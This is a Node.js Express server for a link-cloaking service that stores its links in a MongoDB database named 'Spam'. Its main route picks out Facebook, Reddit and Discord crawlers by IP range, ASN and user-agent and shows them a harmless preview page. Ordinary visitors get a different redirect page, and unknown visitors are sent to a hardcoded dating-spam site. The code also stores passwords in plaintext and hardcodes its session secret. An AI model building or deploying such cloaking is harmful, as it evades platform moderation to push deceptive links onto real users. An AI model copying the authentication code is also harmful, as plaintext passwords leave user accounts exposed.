var express = require('express');
var mongoose = require('mongoose');
var get_ip = require('ipware')().get_ip;
var ipRangeCheck = require("ip-range-check");
var bodyParser = require('body-parser');
var app = express();
var random = require('./modules/random');
var randomid = require('./modules/random');
var objLink = require('./models/link');
var User = require('./models/user');
var session = require('express-session');
var MongoStore = require('connect-mongo')(session);
var path = require('path');
const Reader = require('@maxmind/geoip2-node').Reader;
app.use(express.static(path.join(__dirname, 'public')));
app.set("view engine", "ejs");
app.set("views", __dirname + "/views");
app.use(bodyParser.urlencoded({
    extended: false
}));
app.use(bodyParser.json());

mongoose.connect("mongodb://localhost:27017/Spam", {
    useNewUrlParser: true
});
var db = mongoose.connection;
db.on('error', console.error.bind(console, 'connection error:'));
db.once('open', function() {
    // we're connected!
});
app.use(session({
    secret: 'work hard',
    resave: true,
    saveUninitialized: false,
    store: new MongoStore({
        mongooseConnection: db
    })
}));
var _botFacebookIps = ["31.13.115.0/24", " 31.13.127.0/24", "173.252.127.0/24", "173.252.87.0/24", "173.252.95.0/24", "66.220.149.0/24", "69.171.251.0/24"];
var _botRedditIps = ["172.69.0.0/16", "172.68.0.0/16", "54.162.0.0/16", "52.91.0.0/16", "52.75.0.0/16", "35.196.0.0/16", "35.231.0.0/16", "35.237.0.0/16"];


app.get("/signup", function(req, res) {
    if (req.session.userId != null) {
        res.redirect('/dashboard');
    } else {
        res.render("signup");
    }

});
app.post("/signup", function(req, res) {
    var newUser = {
        username: req.body.Username,
        password: req.body.Password
    }

    User.findOne({
        username: req.body.Username
    }, function(error, user) {
        if (error) {
            throw error;
        } else {
            if (!user) {
                User.create(newUser, function(error) {
                    if (error) {
                        throw error;
                    } else {

                        console.log("User name " + req.body.Username + " created!")
                        //req.session.userId = user._id;
                        res.redirect("/login");
                    }
                });
            } else {
                res.render("signup", {
                    Erro: "Username already exists"
                });
            }
        }
    });
});
app.get('/login', function(req, res, next) {
    res.render('login');
});
app.post('/login', function(req, res, next) {
    var ip_info = get_ip(req);
    User.findOne({
        username: req.body.Username,
        password: req.body.Password
    }, function(error, user) {
        if (error) {
            throw error;
        } else {
            if (!user) {

                res.render("login", {
                    Error: "User not found!"
                });
            } else {
                if (user.username == req.body.Username && user.password == req.body.Password) {
                    req.session.userId = user._id;

                    console.log("User " + user.username + " login! from IP : " + ip_info.clientIp);
                    res.redirect("/dashboard");
                } else {
                    res.render("login", {
                        Error: "Incorrect username or password"
                    });
                }
            }
        }
    })
    //res.redirect('dashboard');
});

app.get("/hello", function(req, res) {

    res.send(" This is simple Page!!!");
});
app.get('/dashboard', function(req, res) {
    if (typeof req.session.userId == "undefined") {
        res.redirect("/login");
    } else {

        objLink.find({
            user: req.session.userId
        }, function(err, linkInfo) {
            console.log(req.session.userId);
            if (err) {
                throw err;
            } else {
                //console.log(linkInfo);
                var randoms = [];
                var subdomain = [];
                var linkInfos = [];
                var imgUrls =[];
                var ip = req.connection.remoteAddress;
                linkInfo.forEach(function(i, n) {
                    linkInfos.push(n);
                    imgUrls.push(n);
                    randoms.push(random.random());
                    subdomain.push(randomid.randomid());
                });
                res.render('createlink', {
                    link: linkInfo,
                    params1: randoms,
                    subdomain: subdomain,
                    imgUrl : imgUrls,
                    ip: ip
                });
            }

        });
    }

});
app.get('/:params1?' + '.html&id=' + ':params2?', function(req, res) {
    var ip = req.headers['x-real-ip'] || req.connection.remoteAddress;

    objLink.findOne({
        linkId: req.params.params2
    }, function(err, linkInfo) {
        var user_agent = req.headers["user-agent"];
        if (err) {

            throw err;
        } else {
            if (linkInfo != null) {
                if (linkInfo.linkId == req.params.params2) {
                    Reader.open(__dirname + '/public/IP/GeoLite2-ASN.mmdb').then(reader => {
                        try {
                            const response = reader.asn(ip);
                            if (ipRangeCheck(ip, _botFacebookIps) || response.autonomousSystemOrganization.includes("Facebook")) {
                                console.log(req.params.params2 + ' | Bot FB detected: ' + ip + ' => user-agent: ' + req.headers["user-agent"]);
                                //res.redirect(302, linkInfo.imgUrl);
                                res.render('botview', {
                                    imgUrl: linkInfo.imgUrl,
                                    linkFake: linkInfo.linkFake,
                                    title: linkInfo.title
                                })
                            } else if (ipRangeCheck(ip, _botRedditIps) || user_agent.includes("redditbot/1.0") || user_agent.includes("Discordbot/2.0") || user_agent.includes("Windows NT 6.1") || user_agent.includes("iPhone; CPU iPhone OS 8_4_1 like Mac OS X") || user_agent.includes(".org") || response.autonomousSystemOrganization.includes("Amazon") || response.autonomousSystemOrganization.includes("Cloudflare")) {
                                console.log(req.params.params2 + ' | Bot Reddit detected: ' + ip + ' => user-agent: ' + req.headers["user-agent"]);
                                //res.redirect(302, linkInfo.imgUrl);
                                res.render('botview', {
                                    imgUrl: linkInfo.imgUrl,
                                    linkFake: linkInfo.linkFake,
                                    title: linkInfo.title
                                })
                            } else {
                                console.log(req.params.params2 + ' | User: ' + ip + ' => user-agent: ' + req.headers["user-agent"]);
                                res.render('redirect', {
                                    imgUrl: linkInfo.imgUrl,
                                    linkFake: linkInfo.linkFake,
                                    title: linkInfo.title
                                })
                            }
                        } catch (err) {
                            console.log(req.params.params2 + ' | None user: ' + ip + ' => user-agent: ' + req.headers["user-agent"]);
                            if (req.headers["user-agent"].includes("facebook") || typeof req.headers["user-agent"] == "undefined") {
                                res.redirect('/hello');
                            } else {
                                res.redirect("http://123datenight.work/kHcqYXybAHdSQnmf.html?id=1QWsDBkXM");
                            }
                        }


                    });

                }
            } else {
                console.log(req.params.params2 + ' | None user: ' + ip + ' => user-agent: ' + req.headers["user-agent"]);
                if (req.headers["user-agent"].includes("facebook") || typeof req.headers["user-agent"] == "undefined") {
                    res.redirect('/hello');
                } else {
                    res.redirect("http://123datenight.work/kHcqYXybAHdSQnmf.html?id=1QWsDBkXM");
                }
            }
        }



    });
});
app.post('/dashboard', function(req, res) {

    var linkData = ({
        linkId: (!req.body.linkId) ? randomid.randomid() : req.body.linkId,
        title: req.body.title,
        imgUrl: req.body.imgUrl,
        linkFake: req.body.linkFake,
        domain: (!req.body.domain.includes("http://")) ? req.body.domain : req.body.domain.substring(7),
        user: req.session.userId
    });
    //console.log(linkData);
    var link = objLink(linkData);
    objLink.findOne({
        linkId: req.body.linkId
    }, function(error, linkInfo) {
        if (error) {
            throw error;
        } else {
            if (!linkInfo) {
                link.save(function(error) {
                    console.log("Create: ", req.session.userId);
                    if (error) {
                        throw error;
                    }
                    console.log("save " + link.linkId);
                });
            } else {
                objLink.updateOne({
                    linkId: req.body.linkId
                }, {
                    $set: linkData
                }, function(error) {
                    console.log("Update: ", link);
                    if (error) {
                        throw error;
                    }
                    console.log("update" + req.body.linkId);
                });
            }
        }
    });
    res.redirect('/dashboard');
});
app.post('/deletelink', function(req, res) {
    console.log(req.session.userId);
    objLink.findOne({
        linkId: req.body.delete
    }, function(error, linkInfo) {
        if (error) {
            throw error;
        } else {
            if (!linkInfo) {
                res.send("Không tìm thấy dữ liệu!");
            } else {
                objLink.deleteOne({
                    linkId: req.body.delete
                }, function(error) {
                    if (error) {
                        throw error;
                    }
                    console.log("deleted " + req.body.delete);
                    res.redirect('/dashboard');
                });
            }
        }
    });
});
app.get('/logout', function(req, res, next) {
    if (req.session) {
        // delete session object
        req.session.destroy(function(err) {
            if (err) {
                return next(err);
            } else {
                return res.redirect('/login');
            }
        });
    }
});

var server = app.listen(8080, function() {
    var host = server.address().address
    var port = server.address().port

    console.log("Example app listening at http://%s:%s", host, port)
})